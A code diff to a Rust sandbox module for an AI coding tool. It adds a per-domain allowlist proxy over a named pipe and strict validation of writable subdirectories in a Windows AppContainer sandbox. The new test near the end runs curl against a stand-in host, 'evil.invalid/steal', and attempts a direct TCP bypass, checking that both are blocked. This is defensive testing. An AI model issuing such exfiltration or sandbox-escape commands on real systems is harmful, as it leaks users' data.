@@ -3,7 +3,7 @@
 //! 取贡院号舍之意：考生锁入单间，与外界隔绝。测试命令可能运行模型写入的代码，入号舍后
 //! 不能联网，只能写测试副本所在的临时目录，读不到家目录下常见的凭据（`.ssh`、`.aws` 等）
 //! 与项目的 `.ziyuan`。Linux 用 bubblewrap（`bwrap`），macOS 用系统自带的 Seatbelt
-//! （`sandbox-exec`）；Windows `run_tests`（W2）与断网 stdio 外藩（W3）用原生 AppContainer＋Job Object（`ziyuan-sandbox-windows`，默认全断网，见 `docs/adr/0001-windows-sandbox.md`）。
+//! （`sandbox-exec`）；Windows `run_tests`（W2）与长连接 stdio 外藩（W3）用原生 AppContainer＋Job Object（`ziyuan-sandbox-windows`，默认全断网，支持零网络能力命名管道门吏按域名放行与任务私有快照子目录可写，见 `docs/adr/0001-windows-sandbox.md`）。
 //!
 //! 由 `ZIYUAN_SANDBOX` 决定：`auto`（默认）与 `require` 都是有则用、无则拒绝运行
 //! （[`SandboxUnavailable`]），绝不悄悄退化为未入号舍执行；`off` 为皇帝确认风险后不入号舍，
@@ -728,19 +728,25 @@ fn prepend_windows_path(env: &mut Vec<(String, String)>, prefixes: &[PathBuf]) {
     }
 }
 
+/// Windows 原生号舍启用按域名放行门吏时注入容器的命名管道环境变量名。
+pub const WINDOWS_DOOR_PIPE_ENV: &str = "ZIYUAN_HAOSHE_DOOR_PIPE";
+
+#[cfg(windows)]
+const WINDOWS_DOOR_PROXY_ENV: &[&str] = &["HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY"];
+
 #[cfg(windows)]
 fn run_shell_windows(spec: &ShellRunSpec<'_>) -> Result<ShellRunOutput, BoxError> {
-    if spec.network != Network::Off {
+    if spec.network == Network::Open {
         return Err(SandboxUnavailable::new(
             "run_tests",
-            "Windows 原生号舍 W2 首批仅支持全断网（Network::Off），暂不支持 ZIYUAN_SANDBOX_ALLOW 按域名放行或开放联网",
+            "Windows 原生号舍保持零网络能力（ADR-0001），不支持开放联网；如需访问特定域名请改用 ZIYUAN_SANDBOX_ALLOW",
         )
         .into());
     }
     if !spec.extra_writable.is_empty() {
         return Err(SandboxUnavailable::new(
             "run_tests",
-            "Windows 原生号舍 W2 首批不继承外部 CARGO_TARGET_DIR 等额外可写目录，请取消该变量后重试",
+            "Windows 原生号舍不继承外部 CARGO_TARGET_DIR 等宿主可写目录（ADR-0001 禁止修改宿主 ACL），请取消该变量后重试",
         )
         .into());
     }
@@ -750,23 +756,35 @@ fn run_shell_windows(spec: &ShellRunSpec<'_>) -> Result<ShellRunOutput, BoxError
 
     let staged = stage_windows_toolchains(spec)?;
     let toolchain_count = staged.readonly_dirs.len();
+    let (door, door_audit) = match &spec.network {
+        Network::Only(domains) => {
+            let (door_spec, audit) =
+                proxy::start_windows_door(domains.clone(), WINDOWS_DOOR_PIPE_ENV);
+            (Some(door_spec), Some(audit))
+        }
+        Network::Off => (None, None),
+        Network::Open => unreachable!("已前置拦截 Network::Open"),
+    };
 
     let mut writable_dirs = vec![spec.sandbox_base.to_path_buf()];
     if spec.work_dir != spec.sandbox_base && !spec.work_dir.starts_with(spec.sandbox_base) {
         writable_dirs.push(spec.work_dir.to_path_buf());
     }
+    let strip_proxy = door.is_some();
     let mut env: Vec<(String, String)> = spec
         .env
         .iter()
         .filter(|(k, _)| {
             let upper = k.to_ascii_uppercase();
             !WINDOWS_RESERVED_ENV.contains(&upper.as_str())
+                && upper != WINDOWS_DOOR_PIPE_ENV
+                && (!strip_proxy || !WINDOWS_DOOR_PROXY_ENV.contains(&upper.as_str()))
         })
         .map(|(k, v)| (k.clone(), v.to_string_lossy().into_owned()))
         .collect();
     prepend_windows_path(&mut env, &staged.path_entries);
     let capture_limit = spec.max_output.max(spec.max_failure_scan);
-    let result = ziyuan_sandbox_windows::run_shell_sandboxed(
+    let result = ziyuan_sandbox_windows::run_shell_sandboxed_with_door(
         &ziyuan_sandbox_windows::ShellSpec {
             command: spec.command.to_owned(),
             cwd: spec.work_dir.to_path_buf(),
@@ -777,6 +795,7 @@ fn run_shell_windows(spec: &ShellRunSpec<'_>) -> Result<ShellRunOutput, BoxError
             max_output_bytes: Some(capture_limit),
         },
         spec.cancel,
+        door,
     )
     .map_err(|err| -> BoxError {
         if err.kind() == io::ErrorKind::InvalidInput {
@@ -812,10 +831,18 @@ fn run_shell_windows(spec: &ShellRunSpec<'_>) -> Result<ShellRunOutput, BoxError
             .saturating_sub(usize::try_from(spec.max_failure_scan).unwrap_or(usize::MAX));
         Some(String::from_utf8_lossy(&result.output[scan_start..]).into_owned())
     };
-    let mut haoshe_note =
-        "号舍（Windows AppContainer＋Job）：不可联网，只可写测试副本与任务私有目录".to_owned();
+    let mut haoshe_note = format!(
+        "号舍（Windows AppContainer＋Job）：{}，只可写测试副本与任务私有目录",
+        spec.network.describe()
+    );
     if toolchain_count > 0 {
         haoshe_note.push_str(&format!("；准入只读工具链 {toolchain_count} 处"));
+    }
+    if let Some(audit) = door_audit {
+        let denied = audit.denied();
+        if !denied.is_empty() {
+            haoshe_note.push_str(&format!("；门吏已拦下：{}", denied.join("、")));
+        }
     }
     if !result.cleanup_warnings.is_empty() {
         haoshe_note.push_str(&format!(
@@ -843,7 +870,8 @@ pub struct StdioRunSpec<'a> {
     /// 宿主项目根目录：只复制进任务私有只读快照（跳过 `.ziyuan`、`.git`、`.jj`、`.env*` 与构建产物），绝不修改宿主 ACL。
     pub root: &'a Path,
     pub network: &'a Network,
-    /// 名册中请求的额外可写路径（W3 首批保持失败关闭）。
+    /// 名册中请求的额外可写路径：Windows 下仅允许项目内相对子目录（映射到任务私有快照子目录，
+    /// 绝不修改宿主目录 ACL，拒绝 `~/`、绝对路径、`..`、重解析点与敏感目录段）。
     pub extra_write: &'a [String],
     /// 已合并白名单与名册展开值的环境变量。
     pub env: &'a [(String, String)],
@@ -854,6 +882,7 @@ pub struct StdioRunSpec<'a> {
 pub struct WindowsStdioChild {
     sandbox: ziyuan_sandbox_windows::SandboxedStdio,
     base_dir: PathBuf,
+    door_audit: Option<proxy::PipeDoorAudit>,
 }
 
 #[cfg(windows)]
@@ -864,6 +893,13 @@ impl WindowsStdioChild {
 
     pub fn take_stdout(&mut self) -> Option<fs::File> {
         self.sandbox.take_stdout()
+    }
+
+    /// 若启用按域名放行门吏，返回至今被门吏拦下的域名列表。
+    pub fn denied_domains(&self) -> Vec<String> {
+        self.door_audit
+            .as_ref()
+            .map_or_else(Vec::new, proxy::PipeDoorAudit::denied)
     }
 
     pub fn shutdown(&mut self) {
@@ -1009,25 +1045,156 @@ fn resolve_windows_program(
     Err(format!("{operation} 启动失败（{program}）：在 PATH 中找不到可执行文件").into())
 }
 
+#[cfg(windows)]
+fn resolve_windows_extra_write_dirs(
+    operation: &str,
+    root: &Path,
+    workspace_dir: &Path,
+    extra_write: &[String],
+) -> Result<Vec<PathBuf>, BoxError> {
+    let reject = |raw: &str, reason: String| -> BoxError {
+        SandboxUnavailable::new(
+            operation,
+            format!("Windows 原生号舍 haoshe.write 被拒（{raw:?}）：{reason}"),
+        )
+        .into()
+    };
+    let norm_workspace = normalize_windows_long_path(workspace_dir)?;
+    let ws_key = windows_path_key(&norm_workspace);
+    let mut out = Vec::new();
+    let mut seen = std::collections::BTreeSet::new();
+
+    for raw in extra_write {
+        let trimmed = raw.trim();
+        if trimmed.is_empty() {
+            return Err(reject(raw, "路径不能为空".into()));
+        }
+        if trimmed == "~" || trimmed.starts_with("~/") || trimmed.starts_with("~\\") {
+            return Err(reject(
+                raw,
+                "ADR-0001 禁止把家目录（~/…）准入可写，以免改写宿主 ACL 或暴露宿主目录".into(),
+            ));
+        }
+        if trimmed.contains('\0')
+            || trimmed.chars().any(|c| c.is_control())
+            || trimmed.contains(':')
+            || trimmed.starts_with(['/', '\\'])
+        {
+            return Err(reject(
+                raw,
+                "仅允许项目内相对子目录，拒绝绝对路径、盘符、UNC 或控制字符".into(),
+            ));
+        }
+        let rel = Path::new(trimmed);
+        if rel.is_absolute() {
+            return Err(reject(raw, "仅允许项目内相对子目录，拒绝绝对路径".into()));
+        }
+        let mut clean_rel = PathBuf::new();
+        for comp in rel.components() {
+            match comp {
+                std::path::Component::Normal(part) => {
+                    let lower = part.to_string_lossy().to_ascii_lowercase();
+                    if is_forbidden_toolchain_name(part)
+                        || matches!(lower.as_str(), "target" | "node_modules")
+                    {
+                        return Err(reject(
+                            raw,
+                            format!(
+                                "路径包含敏感或禁止写入的目录段 `{}`",
+                                part.to_string_lossy()
+                            ),
+                        ));
+                    }
+                    clean_rel.push(part);
+                }
+                std::path::Component::CurDir => {
+                    return Err(reject(
+                        raw,
+                        "不能把项目快照根目录（`.`）整体设为可写，请指定具体子目录".into(),
+                    ));
+                }
+                std::path::Component::ParentDir
+                | std::path::Component::RootDir
+                | std::path::Component::Prefix(_) => {
+                    return Err(reject(raw, "路径不得包含 `..` 或根前缀".into()));
+                }
+            }
+        }
+        if clean_rel.as_os_str().is_empty() {
+            return Err(reject(raw, "必须指定项目内具体子目录".into()));
+        }
+
+        let mut host_probe = root.to_path_buf();
+        for comp in clean_rel.components() {
+            host_probe.push(comp.as_os_str());
+            if let Ok(meta) = fs::symlink_metadata(&host_probe) {
+                if is_windows_reparse_point(&host_probe) {
+                    return Err(reject(
+                        raw,
+                        format!("宿主路径包含重解析点／符号链接：{}", host_probe.display()),
+                    ));
+                }
+                if !meta.is_dir() {
+                    return Err(reject(
+                        raw,
+                        format!("宿主对应路径不是目录：{}", host_probe.display()),
+                    ));
+                }
+            }
+        }
+
+        let mut snap_probe = workspace_dir.to_path_buf();
+        for comp in clean_rel.components() {
+            snap_probe.push(comp.as_os_str());
+            if let Ok(meta) = fs::symlink_metadata(&snap_probe) {
+                if is_windows_reparse_point(&snap_probe) {
+                    return Err(reject(
+                        raw,
+                        format!("快照路径包含重解析点：{}", snap_probe.display()),
+                    ));
+                }
+                if !meta.is_dir() {
+                    return Err(reject(
+                        raw,
+                        format!(
+                            "快照中已存在同名文件，无法作为可写目录：{}",
+                            snap_probe.display()
+                        ),
+                    ));
+                }
+            } else {
+                fs::create_dir(&snap_probe)?;
+            }
+        }
+        let norm_target = normalize_windows_long_path(&snap_probe)?;
+        let target_key = windows_path_key(&norm_target);
+        if target_key == ws_key
+            || !target_key
+                .strip_prefix(&ws_key)
+                .is_some_and(|rest| rest.starts_with('\\') || rest.starts_with('/'))
+        {
+            return Err(reject(raw, "目标目录越出任务私有项目快照".into()));
+        }
+        if seen.insert(target_key) {
+            out.push(norm_target);
+        }
+    }
+    Ok(out)
+}
+
 /// 在 Windows 原生号舍 W3（零网络能力 AppContainer ＋ `KILL_ON_JOB_CLOSE` Job Object）中启动长连接 stdio 外藩。
 ///
 /// 严格遵循 ADR-0001：
-/// - 仅支持全断网（`Network::Off`）且不把宿主目录准入可写（`extra_write` 为空），其余策略失败关闭；
-/// - 宿主项目根只复制到任务私有只读快照（跳过 `.ziyuan`、`.git`、`.jj`、`.env*` 与构建产物），绝不改写宿主 ACL；
-/// - 仅任务私有 `scratch`（同步写入 `TMPDIR`）与容器私有 `TEMP`/`TMP`/`HOME` 可写。
+/// - 保持 `TokenCapabilities == 0`、零回环豁免、零宿主 ACL 变更；
+/// - `Network::Off` 全断网，`Network::Only(domains)` 经按任务 SID 隔离的命名管道门吏＋容器内桥接只放行名单域名 HTTP(S)，`Network::Open` 失败关闭；
+/// - 宿主项目根只复制到任务私有只读快照（跳过 `.ziyuan`、`.git`、`.jj`、`.env*` 与构建产物），`extra_write` 经严格校验后仅映射为任务私有快照内对应子目录可写（拒绝 `~/`、绝对路径、`..`、重解析点与敏感目录段）；
+/// - 任务私有 `scratch`（同步写入 `TMPDIR`）与容器私有 `TEMP`/`TMP`/`HOME` 可写，停服或 `Drop` 时整树排空清理。
 #[cfg(windows)]
 pub fn spawn_stdio_windows(spec: &StdioRunSpec<'_>) -> Result<WindowsStdioChild, BoxError> {
-    if *spec.network != Network::Off {
+    if *spec.network == Network::Open {
         return Err(SandboxUnavailable::new(
             spec.operation,
-            "Windows 原生号舍 W3 首批仅支持全断网（haoshe.network: false），暂不支持开放联网或按域名放行",
-        )
-        .into());
-    }
-    if !spec.extra_write.is_empty() {
-        return Err(SandboxUnavailable::new(
-            spec.operation,
-            "Windows 原生号舍 W3 首批不支持把宿主项目目录或家目录准入可写（haoshe.write），仅允许任务私有临时目录",
+            "Windows 原生号舍 W3 保持零网络能力（ADR-0001），不支持开放联网（haoshe.network: true）；请改用域名白名单数组或 false",
         )
         .into());
     }
@@ -1047,31 +1214,54 @@ pub fn spawn_stdio_windows(spec: &StdioRunSpec<'_>) -> Result<WindowsStdioChild,
     let launch = (|| -> Result<WindowsStdioChild, BoxError> {
         fs::create_dir_all(&scratch_dir)?;
         crate::tools::copy_project_tree(spec.root, &workspace_dir)?;
+        let extra_writable = resolve_windows_extra_write_dirs(
+            spec.operation,
+            spec.root,
+            &workspace_dir,
+            spec.extra_write,
+        )?;
+        let (door, door_audit) = match spec.network {
+            Network::Only(domains) => {
+                let (door_spec, audit) =
+                    proxy::start_windows_door(domains.clone(), WINDOWS_DOOR_PIPE_ENV);
+                (Some(door_spec), Some(audit))
+            }
+            Network::Off => (None, None),
+            Network::Open => unreachable!("已前置拦截 Network::Open"),
+        };
         let scratch_long = normalize_windows_long_path(&scratch_dir)?;
         let program = resolve_windows_program(spec.operation, spec.program, &workspace_dir)?;
         let cwd = normalize_windows_long_path(&workspace_dir)?;
 
+        let strip_proxy = door.is_some();
         let mut env: Vec<(String, String)> = spec
             .env
             .iter()
             .filter(|(k, _)| {
                 let upper = k.to_ascii_uppercase();
-                !WINDOWS_RESERVED_ENV.contains(&upper.as_str()) && upper != "TMPDIR"
+                !WINDOWS_RESERVED_ENV.contains(&upper.as_str())
+                    && upper != "TMPDIR"
+                    && upper != WINDOWS_DOOR_PIPE_ENV
+                    && (!strip_proxy || !WINDOWS_DOOR_PROXY_ENV.contains(&upper.as_str()))
             })
             .cloned()
             .collect();
         env.push(("TMPDIR".into(), scratch_long.to_string_lossy().into_owned()));
 
-        let sandbox = ziyuan_sandbox_windows::spawn_stdio_sandboxed(
+        let mut writable_dirs = vec![scratch_long];
+        writable_dirs.extend(extra_writable);
+
+        let sandbox = ziyuan_sandbox_windows::spawn_stdio_sandboxed_with_door(
             &ziyuan_sandbox_windows::StdioSpec {
                 program,
                 args: spec.args.to_vec(),
                 cwd: Some(cwd.clone()),
-                writable_dirs: vec![scratch_long],
+                writable_dirs,
                 readonly_dirs: vec![cwd],
                 env,
                 mode: ziyuan_sandbox_windows::SandboxMode::AppContainerChildCapable,
             },
+            door,
         )
         .map_err(|err| -> BoxError {
             if err.kind() == io::ErrorKind::InvalidInput {
@@ -1090,6 +1280,7 @@ pub fn spawn_stdio_windows(spec: &StdioRunSpec<'_>) -> Result<WindowsStdioChild,
         Ok(WindowsStdioChild {
             sandbox,
             base_dir: base_dir.clone(),
+            door_audit,
         })
     })();
 
@@ -1475,11 +1666,11 @@ mod tests {
         let secret_file = host.join("secret.txt");
         fs::write(&secret_file, "HOST_TOP_SECRET_131").unwrap();
 
-        // 1. Network::Only rejected explicitly under ADR-0001 W2 policy.
+        // 1. Network::Open rejected explicitly under ADR-0001 zero-capability policy.
         let net_err = run_shell(&ShellRunSpec {
             command: "echo x",
             mode: Mode::Auto,
-            network: Network::only(vec!["example.com".into()]).unwrap(),
+            network: Network::Open,
             work_dir: &work,
             sandbox_base: &base,
             extra_writable: &[],
@@ -1496,7 +1687,7 @@ mod tests {
             .downcast_ref::<SandboxUnavailable>()
             .expect("must return SandboxUnavailable");
         assert!(
-            net_unavail.reason.contains("全断网"),
+            net_unavail.reason.contains("零网络能力"),
             "{}",
             net_unavail.reason
         );
@@ -1782,6 +1973,118 @@ mod tests {
                 bad.display()
             );
         }
+
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[cfg(windows)]
+    #[test]
+    fn run_shell_windows_allowlist_door_forwards_allowed_blocks_disallowed_and_direct_tcp() {
+        use std::io::Write;
+        use std::net::TcpListener;
+        use std::sync::Arc;
+        use std::sync::atomic::{AtomicBool, AtomicUsize};
+
+        let root = std::env::temp_dir().join(format!("ziyuan-win-allow-{}", std::process::id()));
+        let base = root.join("sandbox");
+        let work = base.join("project");
+        let _ = fs::remove_dir_all(&root);
+        fs::create_dir_all(&work).unwrap();
+
+        let upstream = TcpListener::bind("127.0.0.1:0").unwrap();
+        let upstream_port = upstream.local_addr().unwrap().port();
+        upstream.set_nonblocking(true).unwrap();
+        let stop = Arc::new(AtomicBool::new(false));
+        let stop_up = Arc::clone(&stop);
+        let upstream_hits = Arc::new(AtomicUsize::new(0));
+        let up_hits_bg = Arc::clone(&upstream_hits);
+        let upstream_thread = std::thread::spawn(move || {
+            while !stop_up.load(Ordering::Relaxed) {
+                match upstream.accept() {
+                    Ok((mut stream, _)) => {
+                        up_hits_bg.fetch_add(1, Ordering::SeqCst);
+                        let mut buf = [0u8; 1024];
+                        let _ = stream.read(&mut buf);
+                        let body = "DOOR_UPSTREAM_OK_138";
+                        let _ = write!(
+                            stream,
+                            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
+                            body.len()
+                        );
+                    }
+                    Err(e) if e.kind() == io::ErrorKind::WouldBlock => {
+                        std::thread::sleep(Duration::from_millis(10));
+                    }
+                    Err(_) => break,
+                }
+            }
+        });
+
+        let direct = TcpListener::bind("127.0.0.1:0").unwrap();
+        let direct_port = direct.local_addr().unwrap().port();
+        direct.set_nonblocking(true).unwrap();
+        let direct_hits = Arc::new(AtomicUsize::new(0));
+        let dh = Arc::clone(&direct_hits);
+        let stop_dir = Arc::clone(&stop);
+        let direct_thread = std::thread::spawn(move || {
+            while !stop_dir.load(Ordering::Relaxed) {
+                match direct.accept() {
+                    Ok(_) => {
+                        dh.fetch_add(1, Ordering::SeqCst);
+                    }
+                    Err(e) if e.kind() == io::ErrorKind::WouldBlock => {
+                        std::thread::sleep(Duration::from_millis(10));
+                    }
+                    Err(_) => break,
+                }
+            }
+        });
+
+        let system_root = std::env::var_os("SystemRoot").unwrap();
+        let curl = PathBuf::from(system_root).join("System32").join("curl.exe");
+        let curl_str = curl.to_string_lossy().into_owned();
+        let host_env: Vec<(String, OsString)> = ["PATH", "SystemRoot"]
+            .iter()
+            .filter_map(|k| std::env::var_os(k).map(|v| ((*k).to_owned(), v)))
+            .collect();
+
+        let cmd = format!(
+            r#""{curl_str}" -sS --max-time 5 http://127.0.0.1:{upstream_port}/ok && echo. && "{curl_str}" -sS -w " [DENY_CODE:%{{http_code}}]" --max-time 5 http://evil.invalid/steal && echo. && ("{curl_str}" --noproxy "*" -sS --max-time 2 http://127.0.0.1:{direct_port}/direct && echo DIRECT_ESCAPED || echo DIRECT_BLOCKED)"#
+        );
+
+        let out = run_shell(&ShellRunSpec {
+            command: &cmd,
+            mode: Mode::Require,
+            network: Network::only(vec!["127.0.0.1".into()]).unwrap(),
+            work_dir: &work,
+            sandbox_base: &base,
+            extra_writable: &[],
+            readonly_toolchains: &[],
+            hidden: &[],
+            env: &host_env,
+            timeout: Duration::from_secs(20),
+            max_output: 4096,
+            max_failure_scan: 4096,
+            cancel: None,
+        })
+        .unwrap();
+
+        stop.store(true, Ordering::SeqCst);
+        upstream_thread.join().unwrap();
+        direct_thread.join().unwrap();
+
+        assert!(out.passed, "{out:?}");
+        assert!(out.tail.contains("DOOR_UPSTREAM_OK_138"), "{out:?}");
+        assert!(out.tail.contains("[DENY_CODE:403]"), "{out:?}");
+        assert!(out.tail.contains("DIRECT_BLOCKED"), "{out:?}");
+        assert!(!out.tail.contains("DIRECT_ESCAPED"), "{out:?}");
+        assert!(out.haoshe_note.contains("只放行 127.0.0.1"), "{out:?}");
+        assert!(
+            out.haoshe_note.contains("门吏已拦下：evil.invalid"),
+            "{out:?}"
+        );
+        assert!(upstream_hits.load(Ordering::SeqCst) >= 1);
+        assert_eq!(direct_hits.load(Ordering::SeqCst), 0);
 
         let _ = fs::remove_dir_all(&root);
     }
